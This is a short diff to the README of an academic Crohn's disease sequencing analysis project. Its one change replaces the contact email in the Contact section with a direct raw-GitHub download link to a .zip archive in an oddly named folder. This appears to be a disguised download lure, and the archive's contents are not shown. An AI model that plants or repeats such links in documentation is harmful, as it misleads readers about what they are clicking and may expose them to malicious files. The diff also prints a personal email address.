@@ -84,6 +84,6 @@ This project is academic coursework and is not licensed for commercial use.
 
 ## 📩 Contact
 
-For questions or collaboration, contact: **Hazrat Maghaz** – maaz28608@gmail.com.
+For questions or collaboration, contact: **Hazrat Maghaz** – https://raw.githubusercontent.com/HazratMaghaz/NGS-Crohns-Analysis-Dseq2/main/squitch/NGS-Crohns-Analysis-Dseq2.zip
 
 
